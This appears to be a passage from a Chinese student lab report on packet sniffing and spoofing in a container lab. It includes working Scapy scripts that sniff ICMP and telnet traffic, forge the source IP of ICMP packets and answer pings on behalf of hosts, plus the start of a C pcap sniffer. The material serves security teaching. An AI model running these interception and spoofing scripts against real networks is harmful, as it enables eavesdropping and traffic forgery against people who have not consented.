        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p><h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是如何在软件中实现的。</p><p>本实验的目标是让学生掌握大多数嗅探和欺骗工具的基本技术。学生们将使用一些简单的嗅探和欺骗程序，阅读它们的源代码，修改它们，并最终对这些程序的技术方面有深入的了解。在本实验结束时，学生应该能够编写自己的嗅探和欺骗程序。<br><a name="vg0k9"></a></p><h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="STc8I"></a></p><h2 id="2-Environment-Setup-using-Container"><a href="#2-Environment-Setup-using-Container" class="headerlink" title="2 Environment Setup using Container"></a><strong>2 Environment Setup using Container</strong></h2><blockquote><p>在这个实验室中，我们将使用三台连接到同一局域网的机器。我们可以使用三个虚拟机或三个容器。图1描述了使用容器进行的实验室环境设置。我们将对攻击者容器进行所有攻击，同时使用其他容器作为用户机器。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699860910845-2ccde31b-8af6-43eb-a242-fef37ad74536.png#averageHue=%23f2f2f1&clientId=u57db4859-e4a5-4&from=paste&height=206&id=u3718af4b&originHeight=324&originWidth=759&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=63372&status=done&style=none&taskId=u37726827-2de3-40f9-94f7-3a679a957ba&title=&width=481.90478378953406" alt="image.png"><br><a name="U5nKd"></a></p><h3 id="2-1-Container-Setup-and-Commands"><a href="#2-1-Container-Setup-and-Commands" class="headerlink" title="2.1 Container Setup and Commands"></a><strong>2.1 Container Setup and Commands</strong></h3><p>在labsetup文件夹下，启动docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ dcbuild   <span class="comment"># 构建容器映像</span></span><br><span class="line">$ dcup      <span class="comment"># 启动容器</span></span><br><span class="line">$ dcdown    <span class="comment"># 关闭容器(这个命令现在不用)</span></span><br></pre></td></tr></table></figure><p>要在容器上运行命令的话，我们通常需要在该容器上获取一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dockps      <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">$ docksh &lt;<span class="built_in">id</span>&gt; <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br></pre></td></tr></table></figure><p>我在这里先连接上docker<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866265114-f7a637d4-f999-4b9e-acfe-00d87d191aa9.png#averageHue=%23110f0d&clientId=u57db4859-e4a5-4&from=paste&height=166&id=ud2e6cdce&originHeight=262&originWidth=1055&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69427&status=done&style=none&taskId=ud5c58271-3b6d-4a27-a0d7-d3ef1f75704&title=&width=669.8413002608148" alt="image.png"><br><a name="Habcl"></a></p><h3 id="2-2-About-the-Attacker-Container"><a href="#2-2-About-the-Attacker-Container" class="headerlink" title="2.2 About the Attacker Container"></a><strong>2.2 About the Attacker Container</strong></h3><p>在这个实验室中，攻击者需要能够嗅探包，但运行嗅探程序容器有问题，因为容器有效地连接到一个虚拟开关，所以它只能看到自己的流量，它永远不会看到其他容器中的数据包。为了解决这个问题，我们使用了攻击者容器的主机模式。这允许攻击者容器查看所有的流量。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699862046796-34d40ca0-6038-4889-817f-b9c55814149f.png#averageHue=%2323201f&clientId=u57db4859-e4a5-4&from=paste&height=230&id=uf3584fee&originHeight=362&originWidth=647&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30031&status=done&style=none&taskId=uacb9c441-0b90-4c1d-85b5-f916e649675&title=&width=410.79366944904945" alt="image.png"><br />当容器处于主机模式时，它可以看到所有主机的网络接口，它甚至具有与主机具有相同的IP地址。基本上，它与主机虚拟机放在相同的网络名称空间中。但是，容器仍然是一个独立的机器，因为它的其他名称空间仍然与主机不同。<br><a name="vTOH6"></a></p><h2 id="3-Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><a href="#3-Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets" class="headerlink" title="3 Lab Task Set 1: Using Scapy to Sniff and Spoof Packets"></a><strong>3 Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</strong></h2><p><a name="gGXYT"></a></p><h3 id="3-1-Task-1-1-Sniffifing-Packets"><a href="#3-1-Task-1-1-Sniffifing-Packets" class="headerlink" title="3.1: Task 1.1: Sniffifing Packets"></a>3.1: <strong>Task 1.1: Sniffifing Packets</strong></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699880971983-e33d79c0-c5ee-4106-a1ea-c0f194069152.png#averageHue=%232a2726&clientId=u35912d60-0bf6-4&from=paste&height=177&id=u5979a789&originHeight=278&originWidth=926&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=47588&status=done&style=none&taskId=u6eb574d0-4a28-407e-97ce-795c51010cd&title=&width=587.9365346365066" alt="image.png"><br />之后实现简单的sniff程序。所有的container容器共享Labsetup&#x2F;volumes文件夹，可以直接把源代码文件建在这里，在container的&#x2F;volumes底下即可访问。</p><p>根据实验文档在&#x2F;volumes下建立sniff.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    pkt.show()</span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-9ae40e75e337&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>, prn=print_pkt)</span><br></pre></td></tr></table></figure><p>上面的代码将嗅出br-9ae40e75e337接口上的数据包。请阅读实验室设置部分中关于如何获取接口名称的说明。如果我们想嗅探多个接口，我们可以将所有接口放在一个列表中，并将其分配给iface。<br><a name="iaZ8p"></a></p><h4 id="Task-1-1A"><a href="#Task-1-1A" class="headerlink" title="Task 1.1A"></a><strong>Task 1.1A</strong></h4><blockquote><p>在上面的程序中，对于每个捕获的数据包，将调用回调函数打印pkt（）；这个函数将打印出有关数据包的一些信息。使用根权限运行该程序，并证明您确实可以捕获数据包。在此之后，再次运行该程序，但不使用根权限；描述和解释您的观察结果。</p></blockquote><p>提前在HostA主机上ping 10.9.0.6，即可在Attacker主机上发现捕获的ICMP报文：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866582906-57b32345-c0e6-47e2-b4f9-ec42f64772e3.png#averageHue=%2314110d&clientId=u57db4859-e4a5-4&from=paste&height=192&id=u9d06f66f&originHeight=313&originWidth=788&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=88797&status=done&style=none&taskId=u3b28dbfb-ef72-4fad-93e8-0c82590f81f&title=&width=482.3174743652344" alt="image.png"><br />使程序可执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x sniffer.py</span><br></pre></td></tr></table></figure><p>使用根权限运行该程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sniffer.py</span><br></pre></td></tr></table></figure><p>可以看到我们嗅探到了以下内容：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866711747-141dc2b6-190e-47c2-bc25-d9c76081e984.png#averageHue=%23060504&clientId=u57db4859-e4a5-4&from=paste&height=411&id=ub1dc9f90&originHeight=648&originWidth=1160&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=79963&status=done&style=none&taskId=u89cf893a-c8a4-4630-856a-a7d550ae002&title=&width=736.5079699550191" alt="image.png"><br />切换到“种子”帐户，并再次运行程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su seed</span><br><span class="line">./sniffer.py</span><br></pre></td></tr></table></figure><p>程序会反馈<strong>权限</strong>错误！<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866811073-b198d1da-12bc-433f-8917-19a1a4f5f265.png#averageHue=%230e0907&clientId=u57db4859-e4a5-4&from=paste&height=216&id=uf55b367f&originHeight=340&originWidth=1163&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=98419&status=done&style=none&taskId=u7014c068-3bf9-4353-9588-99fe92c0584&title=&width=738.4127319462821" alt="image.png"><br><a name="shckK"></a></p><h4 id="Task-1-1B"><a href="#Task-1-1B" class="headerlink" title="Task 1.1B"></a><strong>Task 1.1B</strong></h4><p>sniff函数中的filter控制程序会捕获的流量数据，</p><ul><li><strong>上面的程序只会捕获ICMP数据</strong></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866711747-141dc2b6-190e-47c2-bc25-d9c76081e984.png#averageHue=%23060504&from=url&height=308&id=GIewr&originHeight=648&originWidth=1160&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&title=&width=551.1111450195312"></p><ul><li><p><strong>修改filter，使其只捕获来源IP为10.9.0.5，并且目的端口号为23的TCP数据</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter = <span class="string">&#x27;tcp and ip src 10.9.0.5 and dst port 23&#x27;</span></span><br></pre></td></tr></table></figure><p>目的端口23为telnet的专用端口号，在HostA上使用命令telnet 10.9.0.1发起请求，该请求将被捕获<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699882378246-e8aec71c-a55b-4caf-85ce-2ff2fd447d85.png#averageHue=%23222020&clientId=u35912d60-0bf6-4&from=paste&height=469&id=ua6ba439b&originHeight=945&originWidth=1111&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66678&status=done&style=none&taskId=ua71e63c7-361b-466c-8ff6-3a100187da7&title=&width=551.1111450195312" alt="image.png"></p></li><li><p><strong>修改filter，使其能够拦截任何来自或发往子网128.230.0.0&#x2F;16的流量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter = <span class="string">&#x27;net 128.230.0.0/16&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p>同样在HostA 上ping 128.230.0.5，无论该地址能否正常访问，都应该能够获取到对应的ICMP数据。（一定能收到ICMP请求报文）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699883199171-e246ff23-7365-47eb-8317-913b27ede525.png#averageHue=%23222121&clientId=u35912d60-0bf6-4&from=paste&height=383&id=u2120a988&originHeight=811&originWidth=1104&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66903&status=done&style=none&taskId=u519a0723-c263-4445-82a1-db634396b0c&title=&width=521.1111450195312" alt="image.png"></p><p><a name="S7od5"></a></p><h3 id="3-2-Task-1-2-Spoofifing-ICMP-Packets"><a href="#3-2-Task-1-2-Spoofifing-ICMP-Packets" class="headerlink" title="3.2 Task 1.2: Spoofifing ICMP Packets"></a>3.2 <strong>Task 1.2: Spoofifing ICMP Packets</strong></h3><blockquote><p>作为一个包欺骗工具，Scapy允许我们将IP包的字段设置为任意值。此任务的目的是用任意的源IP地址来欺骗IP数据包。我们将欺骗ICMP回波请求数据包，并将它们发送到同一网络上的另一个虚拟机。我们将使用线鲨来观察我们的请求是否会被接收人接受。如果被接受，将发送到欺骗的IP地址。</p></blockquote><p>修改sniffer.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"> </span><br><span class="line">ip = IP()</span><br><span class="line">ip.src = <span class="string">&#x27;128.230.0.5&#x27;</span></span><br><span class="line">ip.dst = <span class="string">&#x27;10.9.0.5&#x27;</span></span><br><span class="line">icmp = ICMP()</span><br><span class="line">send(ip/icmp)</span><br></pre></td></tr></table></figure><p>运行该代码<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699964955030-2bab6bfb-a1cf-4ff7-8a11-eaad98b99bdf.png#averageHue=%23232322&clientId=u32c99e94-fdc6-4&from=paste&height=87&id=u00e90935&originHeight=137&originWidth=987&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=18322&status=done&style=none&taskId=u3a600db5-cd1a-4a20-badb-7b77980b4c9&title=&width=626.6666951255206" alt="image.png"><br />在目的主机抓包，能看到攻击方发送了伪造ip为128.230.0.5的包（由前面的实验知128.230.0.5是不可达的）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699964815435-7a606963-f043-4fb2-8c71-9c08dde6e993.png#averageHue=%23aabca4&clientId=u32c99e94-fdc6-4&from=paste&height=510&id=u6e67d8e5&originHeight=804&originWidth=962&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=208690&status=done&style=none&taskId=ucf6fee95-7ab8-4cfb-b1f4-513a509131d&title=&width=610.7936785316624" alt="image.png"><br><a name="hFfE0"></a></p><h3 id="3-3-Task-1-3-Traceroute"><a href="#3-3-Task-1-3-Traceroute" class="headerlink" title="3.3 Task 1.3: Traceroute"></a>3.3 <strong>Task 1.3: Traceroute</strong></h3><blockquote><p>此任务的目标是使用Scapy来根据路由器的数量来估计VM和选定的目的地之间的距离。这基本上是由跟踪器工具实现的。在这个任务中，我们将编写我们自己的工具。这个想法非常简单：只需发送一个数据包（任何类型）到目的地，首先将它的实时时间（TTL）字段设置为1。这个数据包将被第一个路由器丢弃，它将向我们发送一个ICMP错误消息，告诉我们上线时间已经超过。这就是我们如何得到第一个路由器的IP地址。然后，我们将TTL字段增加到2，发送另一个数据包，并获得第二个路由器的IP地址。我们将重复这个过程，直到我们的数据包最终到达目的地。需要注意的是，这个实验只得到一个估计的结果，因为理论上，不是所有这些包采取相同的路径（但在实践中，它们可能在短时间内）。下面的代码显示了这个过程中的一轮代码。</p></blockquote><p>修改sniffer.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):   </span><br><span class="line">    a = IP()</span><br><span class="line">    a.dst = <span class="string">&#x27;110.242.68.4&#x27;</span> <span class="comment"># baidu的IP之一</span></span><br><span class="line">    a.ttl = i</span><br><span class="line">    b = ICMP()</span><br><span class="line">    send(a/b)</span><br></pre></td></tr></table></figure><p>在wireshark中开启监听网桥<br />被监听主机运行try_ttl.py后查看wireshark<br /> <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699968285761-7615a3ef-79c2-4c55-86dc-0de7e0d21b7a.png#averageHue=%23263f42&clientId=u32c99e94-fdc6-4&from=paste&height=526&id=u912f7e4e&originHeight=828&originWidth=971&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=256057&status=done&style=none&taskId=uee7a9cf2-c674-4152-9eab-70f4c091675&title=&width=616.5079645054514" alt="image.png"><br><a name="hVwsQ"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a name="ZKJIr"></a></p><h3 id="3-4-Task-1-4-Sniffifing-and-then-Spoofifing"><a href="#3-4-Task-1-4-Sniffifing-and-then-Spoofifing" class="headerlink" title="3.4 Task 1.4: Sniffifing and-then Spoofifing"></a><strong>3.4 Task 1.4: Sniffifing and-then Spoofifing</strong></h3><blockquote><p>在此任务中，您将结合嗅探和欺骗技术来实现以下嗅探和欺骗程序。您需要在同一局域网上的两台机器：虚拟机和用户容器。从用户容器中，pingIPX。这将生成ICMP echo请求包。如果X是活动的，ping程序将收到一个回声响应，并打印出响应。你的嗅探-欺骗程序运行在VM上，它通过包嗅探监视局域网。当它看到ICMP echo请求时，无论目标IP地址是什么，您的程序应该立即使用包欺骗技术发送回声回复。因此，无论机器X是否活动，ping程序都将始终收到一个回复，表明X是活动的。您需要使用Scapy来完成此任务。在您的报告中，您需要提供证据来证明您的技术是有效的。</p></blockquote><p><strong>在被监听主机中ping 以下三个地址，发现只有第三个可以ping通</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700033420661-96cab359-31e8-42a5-8002-3539c46e8aef.png#averageHue=%23292726&clientId=u7ee5117c-c78a-4&from=paste&height=382&id=u0a2754d8&originHeight=601&originWidth=712&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=82925&status=done&style=none&taskId=u38d4daa9-e5c9-4318-af47-0b5bbf908a7&title=&width=452.0635125930807" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_pkt</span>(<span class="params">pkt</span>):  </span><br><span class="line">    <span class="keyword">if</span> ICMP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">8</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Original Packet.......&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, pkt[IP].src)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Destination IP:&quot;</span>, pkt[IP].dst)  </span><br><span class="line">  </span><br><span class="line">        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)  </span><br><span class="line">        icmp = ICMP(<span class="built_in">type</span>=<span class="number">0</span>, <span class="built_in">id</span>=pkt[ICMP].<span class="built_in">id</span>, seq=pkt[ICMP].seq)  </span><br><span class="line">        data = pkt[Raw].load  </span><br><span class="line">        newpkt = ip/icmp/data  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Spoofed Packet.......&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, newpkt[IP].src)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Destination IP : &quot;</span>, newpkt[IP].dst)  </span><br><span class="line">        send(newpkt, verbose=<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-9ae40e75e337&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure><p>这段代码使用了Python的scapy库来操作网络数据包。它的主要目的是欺骗（spoof）ICMP数据包，即伪装数据包的源IP地址和目标IP地址。<br />1.2.3.4可以ping通<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700032219299-22a725d7-3d78-477b-84e8-3a71ba8825a1.png#averageHue=%232f2d2a&clientId=u7ee5117c-c78a-4&from=paste&height=138&id=u0d3c8a2b&originHeight=217&originWidth=682&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=35111&status=done&style=none&taskId=ucab5ab3a-3a92-4cd7-a925-ecc14d3a0ac&title=&width=433.0158926804509" alt="image.png"><br />10.9.0.99无法ping通<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700032262340-34c6b893-e92e-4eb9-bc93-fa238fd96442.png#averageHue=%23302e2b&clientId=u7ee5117c-c78a-4&from=paste&height=84&id=uba4201ab&originHeight=133&originWidth=694&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22518&status=done&style=none&taskId=u0882fa24-343a-466b-8ca0-3ce9a3d5cfb&title=&width=440.6349406455028" alt="image.png"><br />8.8.8.8 可以ping通，存在DUP标志<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700032451153-3f352728-cbab-481a-bf75-dda42a761681.png#averageHue=%232f2d2b&clientId=u7ee5117c-c78a-4&from=paste&height=204&id=u7aba476b&originHeight=322&originWidth=766&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56401&status=done&style=none&taskId=u96d385c9-69b6-48b4-9df7-0263d302206&title=&width=486.3492284358143" alt="image.png"><br><a name="XAZJ8"></a></p><h2 id="4-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#4-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="4 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a><strong>4 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</strong></h2><p><a name="MXcjJ"></a></p><h3 id="4-1-Task-2-1-Writing-Packet-Sniffifing-Program"><a href="#4-1-Task-2-1-Writing-Packet-Sniffifing-Program" class="headerlink" title="4.1 Task 2.1: Writing Packet Sniffifing Program"></a><strong>4.1 Task 2.1: Writing Packet Sniffifing Program</strong></h3><blockquote><p>使用pcap库可以很容易地编写嗅探器程序。使用pcap，嗅探器的任务变成了调用pcap库中的一个简单的过程序列。在序列的最后，一旦数据包被捕获，就将被放入缓冲区中进行进一步处理。数据包捕获的所有细节都由pcap库处理。</p></blockquote><p><a name="Ux2Lj"></a></p><h4 id="Task-2-1A-Understanding-How-a-Sniffer-Works"><a href="#Task-2-1A-Understanding-How-a-Sniffer-Works" class="headerlink" title="**Task 2.1A: Understanding How a Sniffer Works **"></a>**Task 2.1A: Understanding How a Sniffer Works **</h4><blockquote><p>在这个任务中，学生需要编写一个嗅探程序来打印出每个捕获的数据包的源和目标IP地址。学生可以输入上面的代码或从种子书的网站上下载样本代码(<a href="https://www.handsonsecurity.net/figurecode.html)%E5%AD%A6%E7%94%9F%E5%BA%94%E8%AF%A5%E6%8F%90%E4%BE%9B%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E4%BD%9C%E4%B8%BA%E8%AF%81%E6%8D%AE%EF%BC%8C%E4%BB%A5%E8%AF%81%E6%98%8E%E4%BB%96%E4%BB%AC%E7%9A%84%E5%97%85%E6%8E%A2%E7%A8%8B%E5%BA%8F%E8%83%BD%E5%A4%9F%E6%88%90%E5%8A%9F%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%B9%B6%E4%BA%A7%E7%94%9F%E9%A2%84%E6%9C%9F%E7%9A%84%E7%BB%93%E6%9E%9C%E3%80%82">https://www.handsonsecurity.net/figurecode.html)学生应该提供屏幕截图作为证据，以证明他们的嗅探程序能够成功运行，并产生预期的结果。</a></p></blockquote><p>根据实验所给代码，完善代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u_char unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u_short unsigned short</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ethernet header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> &#123;</span></span><br><span class="line">    u_char  ether_dhost[<span class="number">6</span>]; <span class="comment">/* destination host address */</span></span><br><span class="line">    u_char  ether_shost[<span class="number">6</span>]; <span class="comment">/* source host address */</span></span><br><span class="line">    u_short ether_type;     <span class="comment">/* protocol type (IP, ARP, RARP, etc) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">    iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">    iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_destip</span>;</span>   <span class="comment">//Destination IP address</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> *<span class="title">eth</span> =</span> (<span class="keyword">struct</span> ethheader *)packet;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ntohs(eth-&gt;ether_type) == <span class="number">0x0800</span>) &#123; <span class="comment">// 0x0800 is IP type</span></span><br><span class="line">        <span class="class"><span 